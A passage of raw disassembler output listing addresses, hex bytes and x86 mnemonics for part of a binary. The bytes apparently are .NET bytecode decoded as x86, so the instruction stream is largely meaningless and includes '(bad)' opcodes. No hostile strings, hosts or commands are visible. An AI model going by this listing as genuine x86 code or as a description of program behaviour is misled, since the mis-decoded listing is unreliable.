  404233:	11 1d 8d 57 00 00    	adc    %ebx,0x578d
  404239:	01 25 16 72 f8 10    	add    %esp,0x10f87216
  40423f:	00 70 a2             	add    %dh,-0x5e(%eax)
  404242:	25 17 02 a2 25       	and    $0x25a20217,%eax
  404247:	18 72 a1             	sbb    %dh,-0x5f(%edx)
  40424a:	11 00                	adc    %eax,(%eax)
  40424c:	70 a2                	jo     0x4041f0
  40424e:	25 19 03 a2 25       	and    $0x25a20319,%eax
  404253:	1a 72 d3             	sbb    -0x2d(%edx),%dh
  404256:	11 00                	adc    %eax,(%eax)
  404258:	70 a2                	jo     0x4041fc
  40425a:	25 1b 04 a2 25       	and    $0x25a2041b,%eax
  40425f:	1c 72                	sbb    $0x72,%al
  404261:	f2 15 00 70 a2 28    	repnz adc $0x28a27000,%eax
  404267:	8f 00                	pop    (%eax)
  404269:	00 0a                	add    %cl,(%edx)
  40426b:	0a 28                	or     (%eax),%ch
  40426d:	90                   	nop
  40426e:	00 00                	add    %al,(%eax)
  404270:	0a 72 91             	or     -0x6f(%edx),%dh
  404273:	16                   	push   %ss
  404274:	00 70 28             	add    %dh,0x28(%eax)
  404277:	91                   	xchg   %eax,%ecx
  404278:	00 00                	add    %al,(%eax)
  40427a:	0a 0c 12             	or     (%edx,%edx,1),%cl
  40427d:	02 72 b6             	add    -0x4a(%edx),%dh
  404280:	12 00                	adc    (%eax),%al
  404282:	70 28                	jo     0x4042ac
  404284:	92                   	xchg   %eax,%edx
  404285:	00 00                	add    %al,(%eax)
  404287:	0a 72 ba             	or     -0x46(%edx),%dh
  40428a:	12 00                	adc    (%eax),%al
  40428c:	70 28                	jo     0x4042b6
  40428e:	34 00                	xor    $0x0,%al
  404290:	00 0a                	add    %cl,(%edx)
  404292:	28 2b                	sub    %ch,(%ebx)
  404294:	00 00                	add    %al,(%eax)
  404296:	0a 0b                	or     (%ebx),%cl
  404298:	07                   	pop    %es
  404299:	06                   	push   %es
  40429a:	28 93 00 00 0a 72    	sub    %dl,0x720a0000(%ebx)
  4042a0:	c4 12                	les    (%edx),%edx
  4042a2:	00 70 72             	add    %dh,0x72(%eax)
  4042a5:	96                   	xchg   %eax,%esi
  4042a6:	06                   	push   %es
  4042a7:	00 70 07             	add    %dh,0x7(%eax)
  4042aa:	72 96                	jb     0x404242
  4042ac:	06                   	push   %es
  4042ad:	00 70 28             	add    %dh,0x28(%eax)
  4042b0:	34 00                	xor    $0x0,%al
  4042b2:	00 0a                	add    %cl,(%edx)
  4042b4:	28 25 00 00 0a 26    	sub    %ah,0x260a0000
  4042ba:	20 2c 01             	and    %ch,(%ecx,%eax,1)
  4042bd:	00 00                	add    %al,(%eax)
  4042bf:	28 3a                	sub    %bh,(%edx)
  4042c1:	00 00                	add    %al,(%eax)
  4042c3:	0a 07                	or     (%edi),%al
  4042c5:	28 30                	sub    %dh,(%eax)
  4042c7:	00 00                	add    %al,(%eax)
  4042c9:	0a de                	or     %dh,%bl
  4042cb:	03 26                	add    (%esi),%esp
  4042cd:	de 00                	fiadds (%eax)
  4042cf:	2a 01                	sub    (%ecx),%al
  4042d1:	10 00                	adc    %al,(%eax)
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 00                	add    %al,(%eax)
  4042d7:	00 98 98 00 03 1a    	add    %bl,0x1a030098(%eax)
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	01 1e                	add    %ebx,(%esi)
  4042e1:	02 28                	add    (%eax),%ch
  4042e3:	4a                   	dec    %edx
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 2a                	or     (%edx),%ch
  4042e8:	4e                   	dec    %esi
  4042e9:	28 3b                	sub    %bh,(%ebx)
  4042eb:	00 00                	add    %al,(%eax)
  4042ed:	0a 02                	or     (%edx),%al
  4042ef:	7b 25                	jnp    0x404316
  4042f1:	00 00                	add    %al,(%eax)
  4042f3:	04 28                	add    $0x28,%al
  4042f5:	3e 00 00             	add    %al,%ds:(%eax)
  4042f8:	0a 2d ee 2a 1e 02    	or     0x21e2aee,%ch
  4042fe:	28 4a 00             	sub    %cl,0x0(%edx)
  404301:	00 0a                	add    %cl,(%edx)
  404303:	2a 42 02             	sub    0x2(%edx),%al
  404306:	7b 27                	jnp    0x40432f
  404308:	00 00                	add    %al,(%eax)
  40430a:	04 03                	add    $0x3,%al
  40430c:	18 5a 18             	sbb    %bl,0x18(%edx)
  40430f:	6f                   	outsl  %ds:(%esi),(%dx)
  404310:	42                   	inc    %edx
  404311:	00 00                	add    %al,(%eax)
  404313:	0a 2a                	or     (%edx),%ch
  404315:	3a 02                	cmp    (%edx),%al
  404317:	7b 28                	jnp    0x404341
  404319:	00 00                	add    %al,(%eax)
  40431b:	04 03                	add    $0x3,%al
  40431d:	1b 6f de             	sbb    -0x22(%edi),%ebp
  404320:	00 00                	add    %al,(%eax)
  404322:	0a 2a                	or     (%edx),%ch
  404324:	1e                   	push   %ds
  404325:	02 28                	add    (%eax),%ch
  404327:	4a                   	dec    %edx
  404328:	00 00                	add    %al,(%eax)
  40432a:	0a 2a                	or     (%edx),%ch
  40432c:	36 02 7b 29          	add    %ss:0x29(%ebx),%bh
  404330:	00 00                	add    %al,(%eax)
  404332:	04 03                	add    $0x3,%al
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	8c 00                	mov    %es,(%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	2a 1e                	sub    (%esi),%bl
  40433b:	02 28                	add    (%eax),%ch
  40433d:	4a                   	dec    %edx
  40433e:	00 00                	add    %al,(%eax)
  404340:	0a 2a                	or     (%edx),%ch
  404342:	4a                   	dec    %edx
  404343:	02 7b 2a             	add    0x2a(%ebx),%bh
  404346:	00 00                	add    %al,(%eax)
  404348:	04 03                	add    $0x3,%al
  40434a:	6f                   	outsl  %ds:(%esi),(%dx)
  40434b:	77 00                	ja     0x40434d
  40434d:	00 0a                	add    %cl,(%edx)
  40434f:	6f                   	outsl  %ds:(%esi),(%dx)
  404350:	8c 00                	mov    %es,(%eax)
  404352:	00 0a                	add    %cl,(%edx)
  404354:	2a 1e                	sub    (%esi),%bl
  404356:	02 28                	add    (%eax),%ch
  404358:	4a                   	dec    %edx
  404359:	00 00                	add    %al,(%eax)
  40435b:	0a 2a                	or     (%edx),%ch
  40435d:	36 02 7b 2b          	add    %ss:0x2b(%ebx),%bh
  404361:	00 00                	add    %al,(%eax)
  404363:	04 03                	add    $0x3,%al
  404365:	6f                   	outsl  %ds:(%esi),(%dx)
  404366:	8c 00                	mov    %es,(%eax)
  404368:	00 0a                	add    %cl,(%edx)
  40436a:	2a 36                	sub    (%esi),%dh
  40436c:	02 7b 2c             	add    0x2c(%ebx),%bh
  40436f:	00 00                	add    %al,(%eax)
  404371:	04 03                	add    $0x3,%al
  404373:	6f                   	outsl  %ds:(%esi),(%dx)
  404374:	8c 00                	mov    %es,(%eax)
  404376:	00 0a                	add    %cl,(%edx)
  404378:	2a 2e                	sub    (%esi),%ch
  40437a:	73 69                	jae    0x4043e5
  40437c:	00 00                	add    %al,(%eax)
  40437e:	06                   	push   %es
  40437f:	80 2d 00 00 04 2a 1e 	subb   $0x1e,0x2a040000
  404386:	02 28                	add    (%eax),%ch
  404388:	4a                   	dec    %edx
  404389:	00 00                	add    %al,(%eax)
  40438b:	0a 2a                	or     (%edx),%ch
  40438d:	42                   	inc    %edx
  40438e:	7e 13                	jle    0x4043a3
  404390:	00 00                	add    %al,(%eax)
  404392:	04 6f                	add    $0x6f,%al
  404394:	d2 00                	rolb   %cl,(%eax)
  404396:	00 0a                	add    %cl,(%edx)
  404398:	28 39                	sub    %bh,(%ecx)
  40439a:	00 00                	add    %al,(%eax)
  40439c:	06                   	push   %es
  40439d:	2a 1e                	sub    (%esi),%bl
  40439f:	02 28                	add    (%eax),%ch
  4043a1:	4a                   	dec    %edx
  4043a2:	00 00                	add    %al,(%eax)
  4043a4:	0a 2a                	or     (%edx),%ch
  4043a6:	00 00                	add    %al,(%eax)
  4043a8:	1b 30                	sbb    (%eax),%esi
  4043aa:	04 00                	add    $0x0,%al
  4043ac:	c0 00 00             	rolb   $0x0,(%eax)
  4043af:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4043b2:	00 11                	add    %dl,(%ecx)
  4043b4:	73 df                	jae    0x404395
  4043b6:	00 00                	add    %al,(%eax)
  4043b8:	0a 25 7e 14 00 00    	or     0x147e,%ah
  4043be:	04 6f                	add    $0x6f,%al
  4043c0:	e0 00                	loopne 0x4043c2
  4043c2:	00 0a                	add    %cl,(%edx)
  4043c4:	25 7e 15 00 00       	and    $0x157e,%eax
  4043c9:	04 6f                	add    $0x6f,%al
  4043cb:	e1 00                	loope  0x4043cd
  4043cd:	00 0a                	add    %cl,(%edx)
  4043cf:	25 19 6f e2 00       	and    $0xe26f19,%eax
  4043d4:	00 0a                	add    %cl,(%edx)
  4043d6:	25 17 6f e3 00       	and    $0xe36f17,%eax
  4043db:	00 0a                	add    %cl,(%edx)
  4043dd:	25 1c 6f e4 00       	and    $0xe46f1c,%eax
  4043e2:	00 0a                	add    %cl,(%edx)
  4043e4:	25 23 00 00 00       	and    $0x23,%eax
  4043e9:	00 00                	add    %al,(%eax)
  4043eb:	00 24 40             	add    %ah,(%eax,%eax,2)
  4043ee:	28 e5                	sub    %ah,%ch
  4043f0:	00 00                	add    %al,(%eax)
  4043f2:	0a 6f e6             	or     -0x1a(%edi),%ch
  4043f5:	00 00                	add    %al,(%eax)
  4043f7:	0a 0a                	or     (%edx),%cl
  4043f9:	72 9b                	jb     0x404396
  4043fb:	16                   	push   %ss
  4043fc:	00 70 02             	add    %dh,0x2(%eax)
  4043ff:	7b 2f                	jnp    0x404430
  404401:	00 00                	add    %al,(%eax)
  404403:	04 72                	add    $0x72,%al
  404405:	a1 16 00 70 28       	mov    0x28700016,%eax
  40440a:	34 00                	xor    $0x0,%al
  40440c:	00 0a                	add    %cl,(%edx)
  40440e:	06                   	push   %es
  40440f:	73 e7                	jae    0x4043f8
  404411:	00 00                	add    %al,(%eax)
  404413:	0a 0b                	or     (%ebx),%cl
  404415:	07                   	pop    %es
  404416:	6f                   	outsl  %ds:(%esi),(%dx)
  404417:	4e                   	dec    %esi
  404418:	00 00                	add    %al,(%eax)
  40441a:	0a 07                	or     (%edi),%al
  40441c:	6f                   	outsl  %ds:(%esi),(%dx)
  40441d:	e8 00 00 0a 2d       	call   0x2d4a4422
  404422:	02 de                	add    %dh,%bl
  404424:	4e                   	dec    %esi
  404425:	07                   	pop    %es
  404426:	72 b9                	jb     0x4043e1
  404428:	16                   	push   %ss
  404429:	00 70 73             	add    %dh,0x73(%eax)
  40442c:	4f                   	dec    %edi
  40442d:	00 00                	add    %al,(%eax)
  40442f:	0a 14 73             	or     (%ebx,%esi,2),%dl
  404432:	50                   	push   %eax
  404433:	00 00                	add    %al,(%eax)
  404435:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404438:	72 d5                	jb     0x40440f
  40443a:	16                   	push   %ss
  40443b:	00 70 6f             	add    %dh,0x6f(%eax)
  40443e:	e9 00 00 0a 0d       	jmp    0xd4a4443
  404443:	09 72 e3             	or     %esi,-0x1d(%edx)
  404446:	16                   	push   %ss
  404447:	00 70 02             	add    %dh,0x2(%eax)
  40444a:	7b 30                	jnp    0x40447c
  40444c:	00 00                	add    %al,(%eax)
  40444e:	04 6f                	add    $0x6f,%al
  404450:	52                   	push   %edx
  404451:	00 00                	add    %al,(%eax)
  404453:	0a 08                	or     (%eax),%cl
  404455:	72 d5                	jb     0x40442c
  404457:	16                   	push   %ss
  404458:	00 70 09             	add    %dh,0x9(%eax)
  40445b:	14 6f                	adc    $0x6f,%al
  40445d:	ea 00 00 0a 26 de 0a 	ljmp   $0xade,$0x260a0000
  404464:	08 2c 06             	or     %ch,(%esi,%eax,1)
  404467:	08 6f 70             	or     %ch,0x70(%edi)
  40446a:	00 00                	add    %al,(%eax)
  40446c:	0a dc                	or     %ah,%bl
  40446e:	de 03                	fiadds (%ebx)
  404470:	26 de 00             	fiadds %es:(%eax)
  404473:	2a 01                	sub    (%ecx),%al
  404475:	1c 00                	sbb    $0x0,%al
  404477:	00 02                	add    %al,(%edx)
  404479:	00 83 00 2d b0 00    	add    %al,0xb02d00(%ebx)
  40447f:	0a 00                	or     (%eax),%al
  404481:	00 00                	add    %al,(%eax)
  404483:	00 00                	add    %al,(%eax)
  404485:	00 00                	add    %al,(%eax)
  404487:	00 bc bc 00 03 13 00 	add    %bh,0x130300(%esp,%edi,4)
  40448e:	00 01                	add    %al,(%ecx)
  404490:	1e                   	push   %ds
  404491:	02 28                	add    (%eax),%ch
  404493:	4a                   	dec    %edx
  404494:	00 00                	add    %al,(%eax)
  404496:	0a 2a                	or     (%edx),%ch
  404498:	1e                   	push   %ds
  404499:	02 28                	add    (%eax),%ch
  40449b:	4a                   	dec    %edx
  40449c:	00 00                	add    %al,(%eax)
  40449e:	0a 2a                	or     (%edx),%ch
  4044a0:	13 30                	adc    (%eax),%esi
  4044a2:	02 00                	add    (%eax),%al
  4044a4:	37                   	aaa
  4044a5:	00 00                	add    %al,(%eax)
  4044a7:	00 2d 00 00 11 12    	add    %ch,0x12110000
  4044ad:	00 28                	add    %ch,(%eax)
  4044af:	94                   	xchg   %eax,%esp
  4044b0:	00 00                	add    %al,(%eax)
  4044b2:	0a 7d 57             	or     0x57(%ebp),%bh
  4044b5:	00 00                	add    %al,(%eax)
  4044b7:	04 12                	add    $0x12,%al
  4044b9:	00 02                	add    %al,(%edx)
  4044bb:	7d 58                	jge    0x404515
  4044bd:	00 00                	add    %al,(%eax)
  4044bf:	04 12                	add    $0x12,%al
  4044c1:	00 15 7d 56 00 00    	add    %dl,0x567d
  4044c7:	04 12                	add    $0x12,%al
  4044c9:	00 7c 57 00          	add    %bh,0x0(%edi,%edx,2)
  4044cd:	00 04 12             	add    %al,(%edx,%edx,1)
  4044d0:	00 28                	add    %ch,(%eax)
  4044d2:	08 00                	or     %al,(%eax)
  4044d4:	00 2b                	add    %ch,(%ebx)
  4044d6:	12 00                	adc    (%eax),%al
  4044d8:	7c 57                	jl     0x404531
  4044da:	00 00                	add    %al,(%eax)
  4044dc:	04 28                	add    $0x28,%al
  4044de:	96                   	xchg   %eax,%esi
  4044df:	00 00                	add    %al,(%eax)
  4044e1:	0a 2a                	or     (%edx),%ch
  4044e3:	00 1b                	add    %bl,(%ebx)
  4044e5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4044e8:	a0 02 00 00 2e       	mov    0x2e000002,%al
  4044ed:	00 00                	add    %al,(%eax)
  4044ef:	11 02                	adc    %eax,(%edx)
  4044f1:	7b 35                	jnp    0x404528
  4044f3:	00 00                	add    %al,(%eax)
  4044f5:	04 0a                	add    $0xa,%al
  4044f7:	06                   	push   %es
  4044f8:	45                   	inc    %ebp
  4044f9:	03 00                	add    (%eax),%eax
  4044fb:	00 00                	add    %al,(%eax)
  4044fd:	61                   	popa
  4044fe:	00 00                	add    %al,(%eax)
  404500:	00 68 01             	add    %ch,0x1(%eax)
  404503:	00 00                	add    %al,(%eax)
  404505:	0d 02 00 00 02       	or     $0x2000002,%eax
  40450a:	73 6d                	jae    0x404579
  40450c:	00 00                	add    %al,(%eax)
  40450e:	06                   	push   %es
  40450f:	7d 37                	jge    0x404548
  404511:	00 00                	add    %al,(%eax)
  404513:	04 7e                	add    $0x7e,%al
  404515:	2e 00 00             	add    %al,%cs:(%eax)
  404518:	04 25                	add    $0x25,%al
  40451a:	2d 17 26 7e 2d       	sub    $0x2d7e2617,%eax
  40451f:	00 00                	add    %al,(%eax)
  404521:	04 fe                	add    $0xfe,%al
  404523:	06                   	push   %es
  404524:	6a 00                	push   $0x0
  404526:	00 06                	add    %al,(%esi)
  404528:	73 eb                	jae    0x404515
  40452a:	00 00                	add    %al,(%eax)
  40452c:	0a 25 80 2e 00 00    	or     0x2e80,%ah
  404532:	04 28                	add    $0x28,%al
  404534:	ec                   	in     (%dx),%al
  404535:	00 00                	add    %al,(%eax)
  404537:	0a 6f ed             	or     -0x13(%edi),%ch
  40453a:	00 00                	add    %al,(%eax)
  40453c:	0a 0b                	or     (%ebx),%cl
  40453e:	12 01                	adc    (%ecx),%al
  404540:	28 ee                	sub    %ch,%dh
  404542:	00 00                	add    %al,(%eax)
  404544:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  40454a:	0a 7d 35             	or     0x35(%ebp),%bh
  40454d:	00 00                	add    %al,(%eax)
  40454f:	04 02                	add    $0x2,%al
  404551:	07                   	pop    %es
  404552:	7d 3b                	jge    0x40458f
  404554:	00 00                	add    %al,(%eax)
  404556:	04 02                	add    $0x2,%al
  404558:	7c 36                	jl     0x404590
  40455a:	00 00                	add    %al,(%eax)
  40455c:	04 12                	add    $0x12,%al
  40455e:	01 02                	add    %eax,(%edx)
  404560:	28 09                	sub    %cl,(%ecx)
  404562:	00 00                	add    %al,(%eax)
  404564:	2b dd                	sub    %ebp,%ebx
  404566:	25 02 00 00 02       	and    $0x2000002,%eax
  40456b:	7b 3b                	jnp    0x4045a8
  40456d:	00 00                	add    %al,(%eax)
  40456f:	04 0b                	add    $0xb,%al
  404571:	02 7c 3b 00          	add    0x0(%ebx,%edi,1),%bh
  404575:	00 04 fe             	add    %al,(%esi,%edi,8)
  404578:	15 3a 00 00 01       	adc    $0x100003a,%eax
  40457d:	02 15 25 0a 7d 35    	add    0x357d0a25,%dl
  404583:	00 00                	add    %al,(%eax)
  404585:	04 12                	add    $0x12,%al
  404587:	01 28                	add    %ebp,(%eax)
  404589:	f0 00 00             	lock add %al,(%eax)
  40458c:	0a 02                	or     (%edx),%al
  40458e:	7b 37                	jnp    0x4045c7
  404590:	00 00                	add    %al,(%eax)
  404592:	04 28                	add    $0x28,%al
  404594:	31 00                	xor    %eax,(%eax)
  404596:	00 0a                	add    %cl,(%edx)
  404598:	6f                   	outsl  %ds:(%esi),(%dx)
  404599:	32 00                	xor    (%eax),%al
  40459b:	00 0a                	add    %cl,(%edx)
  40459d:	6f                   	outsl  %ds:(%esi),(%dx)
  40459e:	33 00                	xor    (%eax),%eax
  4045a0:	00 0a                	add    %cl,(%edx)
  4045a2:	7d 31                	jge    0x4045d5
  4045a4:	00 00                	add    %al,(%eax)
  4045a6:	04 02                	add    $0x2,%al
  4045a8:	28 3b                	sub    %bh,(%ebx)
  4045aa:	00 00                	add    %al,(%eax)
  4045ac:	06                   	push   %es
  4045ad:	7d 39                	jge    0x4045e8
  4045af:	00 00                	add    %al,(%eax)
  4045b1:	04 02                	add    $0x2,%al
  4045b3:	7b 39                	jnp    0x4045ee
  4045b5:	00 00                	add    %al,(%eax)
  4045b7:	04 2d                	add    $0x2d,%al
  4045b9:	05 dd a8 01 00       	add    $0x1a8dd,%eax
  4045be:	00 02                	add    %al,(%edx)
  4045c0:	7b 37                	jnp    0x4045f9
  4045c2:	00 00                	add    %al,(%eax)
  4045c4:	04 1f                	add    $0x1f,%al
  4045c6:	28 73 f1             	sub    %dh,-0xf(%ebx)
  4045c9:	00 00                	add    %al,(%eax)
  4045cb:	0a 7d 32             	or     0x32(%ebp),%bh
  4045ce:	00 00                	add    %al,(%eax)
  4045d0:	04 02                	add    $0x2,%al
  4045d2:	73 f2                	jae    0x4045c6
  4045d4:	00 00                	add    %al,(%eax)
  4045d6:	0a 7d 3a             	or     0x3a(%ebp),%bh
  4045d9:	00 00                	add    %al,(%eax)
  4045db:	04 02                	add    $0x2,%al
  4045dd:	17                   	pop    %ss
  4045de:	7d 3c                	jge    0x40461c
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	04 38                	add    $0x38,%al
  4045e4:	e4 00                	in     $0x0,%al
  4045e6:	00 00                	add    %al,(%eax)
  4045e8:	02 73 6e             	add    0x6e(%ebx),%dh
  4045eb:	00 00                	add    %al,(%eax)
  4045ed:	06                   	push   %es
  4045ee:	7d 38                	jge    0x404628
  4045f0:	00 00                	add    %al,(%eax)
  4045f2:	04 02                	add    $0x2,%al
  4045f4:	7b 38                	jnp    0x40462e
  4045f6:	00 00                	add    %al,(%eax)
  4045f8:	04 02                	add    $0x2,%al
  4045fa:	7b 37                	jnp    0x404633
  4045fc:	00 00                	add    %al,(%eax)
  4045fe:	04 7d                	add    $0x7d,%al
  404600:	34 00                	xor    $0x0,%al
  404602:	00 04 02             	add    %al,(%edx,%eax,1)
  404605:	7b 38                	jnp    0x40463f
  404607:	00 00                	add    %al,(%eax)
  404609:	04 72                	add    $0x72,%al
  40460b:	fb                   	sti
  40460c:	16                   	push   %ss
  40460d:	00 70 02             	add    %dh,0x2(%eax)
  404610:	7b 39                	jnp    0x40464b
  404612:	00 00                	add    %al,(%eax)
  404614:	04 02                	add    $0x2,%al
  404616:	7b 3c                	jnp    0x404654
  404618:	00 00                	add    %al,(%eax)
  40461a:	04 8c                	add    $0x8c,%al
  40461c:	47                   	inc    %edi
  40461d:	00 00                	add    %al,(%eax)
  40461f:	01 28                	add    %ebp,(%eax)
  404621:	f3 00 00             	repz add %al,(%eax)
  404624:	0a 7d 33             	or     0x33(%ebp),%bh
  404627:	00 00                	add    %al,(%eax)
  404629:	04 02                	add    $0x2,%al
  40462b:	7b 38                	jnp    0x404665
  40462d:	00 00                	add    %al,(%eax)
  40462f:	04 7b                	add    $0x7b,%al
  404631:	34 00                	xor    $0x0,%al
  404633:	00 04 7b             	add    %al,(%ebx,%edi,2)
  404636:	32 00                	xor    (%eax),%al
  404638:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40463b:	f4                   	hlt
  40463c:	00 00                	add    %al,(%eax)
  40463e:	0a 6f ed             	or     -0x13(%edi),%ch
  404641:	00 00                	add    %al,(%eax)
  404643:	0a 0b                	or     (%ebx),%cl
  404645:	12 01                	adc    (%ecx),%al
  404647:	28 ee                	sub    %ch,%dh
  404649:	00 00                	add    %al,(%eax)
  40464b:	0a 2d 3f 02 17 25    	or     0x2517023f,%ch
  404651:	0a 7d 35             	or     0x35(%ebp),%bh
  404654:	00 00                	add    %al,(%eax)
  404656:	04 02                	add    $0x2,%al
  404658:	07                   	pop    %es
  404659:	7d 3b                	jge    0x404696
  40465b:	00 00                	add    %al,(%eax)
  40465d:	04 02                	add    $0x2,%al
  40465f:	7c 36                	jl     0x404697
  404661:	00 00                	add    %al,(%eax)
  404663:	04 12                	add    $0x12,%al
  404665:	01 02                	add    %eax,(%edx)
  404667:	28 09                	sub    %cl,(%ecx)
  404669:	00 00                	add    %al,(%eax)
  40466b:	2b dd                	sub    %ebp,%ebx
  40466d:	1e                   	push   %ds
  40466e:	01 00                	add    %eax,(%eax)
  404670:	00 02                	add    %al,(%edx)
  404672:	7b 3b                	jnp    0x4046af
  404674:	00 00                	add    %al,(%eax)
  404676:	04 0b                	add    $0xb,%al
  404678:	02 7c 3b 00          	add    0x0(%ebx,%edi,1),%bh
  40467c:	00 04 fe             	add    %al,(%esi,%edi,8)
  40467f:	15 3a 00 00 01       	adc    $0x100003a,%eax
  404684:	02 15 25 0a 7d 35    	add    0x357d0a25,%dl
  40468a:	00 00                	add    %al,(%eax)
  40468c:	04 12                	add    $0x12,%al
  40468e:	01 28                	add    %ebp,(%eax)
  404690:	f0 00 00             	lock add %al,(%eax)
  404693:	0a 02                	or     (%edx),%al
  404695:	7b 3a                	jnp    0x4046d1
  404697:	00 00                	add    %al,(%eax)
  404699:	04 02                	add    $0x2,%al
  40469b:	7b 38                	jnp    0x4046d5
  40469d:	00 00                	add    %al,(%eax)
  40469f:	04 fe                	add    $0xfe,%al
  4046a1:	06                   	push   %es
  4046a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4046a3:	00 00                	add    %al,(%eax)
  4046a5:	06                   	push   %es
  4046a6:	73 d1                	jae    0x404679
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	0a 28                	or     (%eax),%ch
  4046ac:	f5                   	cmc
  4046ad:	00 00                	add    %al,(%eax)
  4046af:	0a 6f f6             	or     -0xa(%edi),%ch
  4046b2:	00 00                	add    %al,(%eax)
  4046b4:	0a 02                	or     (%edx),%al
  4046b6:	14 7d                	adc    $0x7d,%al
  4046b8:	38 00                	cmp    %al,(%eax)
  4046ba:	00 04 02             	add    %al,(%edx,%eax,1)
  4046bd:	7b 3c                	jnp    0x4046fb
  4046bf:	00 00                	add    %al,(%eax)
  4046c1:	04 0c                	add    $0xc,%al
  4046c3:	02 08                	add    (%eax),%cl
  4046c5:	17                   	pop    %ss
  4046c6:	58                   	pop    %eax
  4046c7:	7d 3c                	jge    0x404705
  4046c9:	00 00                	add    %al,(%eax)
  4046cb:	04 02                	add    $0x2,%al
  4046cd:	7b 3c                	jnp    0x40470b
  4046cf:	00 00                	add    %al,(%eax)
  4046d1:	04 20                	add    $0x20,%al
  4046d3:	ff 00                	incl   (%eax)
  4046d5:	00 00                	add    %al,(%eax)
  4046d7:	3f                   	aas
  4046d8:	0c ff                	or     $0xff,%al
  4046da:	ff                   	(bad)
  4046db:	ff 02                	incl   (%edx)
  4046dd:	7b 3a                	jnp    0x404719
  4046df:	00 00                	add    %al,(%eax)
  4046e1:	04 28                	add    $0x28,%al
  4046e3:	f7 00 00 0a 6f ed    	testl  $0xed6f0a00,(%eax)
  4046e9:	00 00                	add    %al,(%eax)
  4046eb:	0a 0b                	or     (%ebx),%cl
  4046ed:	12 01                	adc    (%ecx),%al
  4046ef:	28 ee                	sub    %ch,%dh
  4046f1:	00 00                	add    %al,(%eax)
  4046f3:	0a 2d 3c 02 18 25    	or     0x2518023c,%ch
  4046f9:	0a 7d 35             	or     0x35(%ebp),%bh
  4046fc:	00 00                	add    %al,(%eax)
  4046fe:	04 02                	add    $0x2,%al
  404700:	07                   	pop    %es
  404701:	7d 3b                	jge    0x40473e
  404703:	00 00                	add    %al,(%eax)
  404705:	04 02                	add    $0x2,%al
  404707:	7c 36                	jl     0x40473f
  404709:	00 00                	add    %al,(%eax)
  40470b:	04 12                	add    $0x12,%al
  40470d:	01 02                	add    %eax,(%edx)
  40470f:	28 09                	sub    %cl,(%ecx)
  404711:	00 00                	add    %al,(%eax)
  404713:	2b de                	sub    %esi,%ebx
  404715:	79 02                	jns    0x404719
  404717:	7b 3b                	jnp    0x404754
  404719:	00 00                	add    %al,(%eax)
  40471b:	04 0b                	add    $0xb,%al
  40471d:	02 7c 3b 00          	add    0x0(%ebx,%edi,1),%bh
  404721:	00 04 fe             	add    %al,(%esi,%edi,8)
  404724:	15 3a 00 00 01       	adc    $0x100003a,%eax
  404729:	02 15 25 0a 7d 35    	add    0x357d0a25,%dl
  40472f:	00 00                	add    %al,(%eax)
  404731:	04 12                	add    $0x12,%al
  404733:	01 28                	add    %ebp,(%eax)
  404735:	f0 00 00             	lock add %al,(%eax)
  404738:	0a de                	or     %dh,%bl
  40473a:	2c 0d                	sub    $0xd,%al
  40473c:	02 1f                	add    (%edi),%bl
  40473e:	fe                   	(bad)
  40473f:	7d 35                	jge    0x404776
  404741:	00 00                	add    %al,(%eax)
  404743:	04 02                	add    $0x2,%al
  404745:	14 7d                	adc    $0x7d,%al
  404747:	37                   	aaa
  404748:	00 00                	add    %al,(%eax)
  40474a:	04 02                	add    $0x2,%al
  40474c:	14 7d                	adc    $0x7d,%al
  40474e:	39 00                	cmp    %eax,(%eax)
  404750:	00 04 02             	add    %al,(%edx,%eax,1)
  404753:	14 7d                	adc    $0x7d,%al
  404755:	3a 00                	cmp    (%eax),%al
  404757:	00 04 02             	add    %al,(%edx,%eax,1)
  40475a:	7c 36                	jl     0x404792
  40475c:	00 00                	add    %al,(%eax)
  40475e:	04 09                	add    $0x9,%al
  404760:	28 f8                	sub    %bh,%al
  404762:	00 00                	add    %al,(%eax)
  404764:	0a de                	or     %dh,%bl
  404766:	28 02                	sub    %al,(%edx)
  404768:	1f                   	pop    %ds
  404769:	fe                   	(bad)
  40476a:	7d 35                	jge    0x4047a1
  40476c:	00 00                	add    %al,(%eax)
  40476e:	04 02                	add    $0x2,%al
  404770:	14 7d                	adc    $0x7d,%al
  404772:	37                   	aaa
  404773:	00 00                	add    %al,(%eax)
  404775:	04 02                	add    $0x2,%al
  404777:	14 7d                	adc    $0x7d,%al
  404779:	39 00                	cmp    %eax,(%eax)
  40477b:	00 04 02             	add    %al,(%edx,%eax,1)
  40477e:	14 7d                	adc    $0x7d,%al
  404780:	3a 00                	cmp    (%eax),%al
  404782:	00 04 02             	add    %al,(%edx,%eax,1)
  404785:	7c 36                	jl     0x4047bd
  404787:	00 00                	add    %al,(%eax)
  404789:	04 28                	add    $0x28,%al
  40478b:	f9                   	stc
  40478c:	00 00                	add    %al,(%eax)
  40478e:	0a 2a                	or     (%edx),%ch
  404790:	41                   	inc    %ecx
  404791:	1c 00                	sbb    $0x0,%al
  404793:	00 00                	add    %al,(%eax)
  404795:	00 00                	add    %al,(%eax)
  404797:	00 07                	add    %al,(%edi)
  404799:	00 00                	add    %al,(%eax)
  40479b:	00 44 02 00          	add    %al,0x0(%edx,%eax,1)
  40479f:	00 4b 02             	add    %cl,0x2(%ebx)
  4047a2:	00 00                	add    %al,(%eax)
  4047a4:	2c 00                	sub    $0x0,%al
  4047a6:	00 00                	add    %al,(%eax)
  4047a8:	1a 00                	sbb    (%eax),%al
  4047aa:	00 01                	add    %al,(%ecx)
  4047ac:	36 02 7c 36 00       	add    %ss:0x0(%esi,%esi,1),%bh
  4047b1:	00 04 03             	add    %al,(%ebx,%eax,1)
  4047b4:	28 fa                	sub    %bh,%dl
  4047b6:	00 00                	add    %al,(%eax)
  4047b8:	0a 2a                	or     (%edx),%ch
  4047ba:	00 00                	add    %al,(%eax)
  4047bc:	1b 30                	sbb    (%eax),%esi
  4047be:	03 00                	add    (%eax),%eax
  4047c0:	b6 00                	mov    $0x0,%dh
